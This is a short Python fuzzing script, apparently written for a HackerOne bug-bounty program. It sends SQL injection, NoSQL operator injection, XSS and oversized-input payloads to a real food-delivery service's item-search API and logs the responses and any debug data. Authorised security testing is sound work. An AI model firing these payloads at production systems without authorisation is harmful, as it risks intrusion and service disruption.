# -*- coding: utf-8 -*-
import requests, json, sys, time
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
H={'Origin':'https://wolt.com','X-HackerOne-Research':'pccp','Content-Type':'application/json','User-Agent':'Mozilla/5.0'}
U='https://consumer-api.wolt.com/consumer-api/consumer-assortment/v1/venues/slug/wolt-market-kamppi/assortment/items/search?language=en'

tests = [
    ('normal', {'q': 'pizza'}),
    ('single_quote', {'q': "'"}),
    ('sqli_basic', {'q': "' OR '1'='1"}),
    ('nosql_inject', {'q': '{"$gt":""}'}),
    ('regex_dos', {'q': 'a' * 5000}),
    ('wildcard', {'q': '*'}),
    ('xss', {'q': '<script>alert(1)</script>'}),
    ('empty_body', {}),
    ('wrong_key', {'search': 'pizza'}),
    ('q_10000', {'q': 'a' * 10000}),
    ('unicode_fuzz', {'q': '\u0000\u0001\u0002'}),
]

for name, body in tests:
    try:
        r=requests.post(U, json=body, headers=H, timeout=20)
        code=r.status_code; l=len(r.text)
        items=0
        if code==200:
            try: items=len(r.json().get('items',[]))
            except: pass
        print(f'{name}: {code} items={items} len={l}')
        # 200 时检查是否有错误标记
        if code==200:
            d=r.json()
            debug=d.get('debug_info')
            if debug: print(f'  debug_info: {json.dumps(debug,ensure_ascii=False)[:200]}')
        time.sleep(0.3)
    except Exception as e:
        print(f'{name}: EXC {str(e)[:150]}')
